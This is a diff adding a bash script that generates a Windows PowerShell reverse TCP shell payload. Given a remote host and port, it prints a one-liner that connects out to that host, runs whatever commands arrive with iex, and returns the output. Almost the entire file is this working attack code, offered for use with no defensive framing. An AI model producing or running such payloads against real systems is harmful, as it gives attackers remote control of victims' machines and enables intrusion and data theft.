@@ -1,0 +1,19 @@
+#!/bin/bash
+
+function Craft_windows_reverse_tcp(){
+
+	if [ -z "$1" ] || [ -z "$2" ]
+	then
+		printf "Auto-gen Windows reverse tcp shell\n"
+		printf "Usage bash windows_ps1-reverse-tcp <rhost> <rport>\n"
+		exit
+	fi
+
+	rhost="$1"
+	rport="$2"
+	printf "\n"
+	printf "\$client = New-Object System.Net.Sockets.TCPClient(\"$rhost\",$rport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close();"
+	printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+}
+
+Craft_windows_reverse_tcp "$1" "$2"
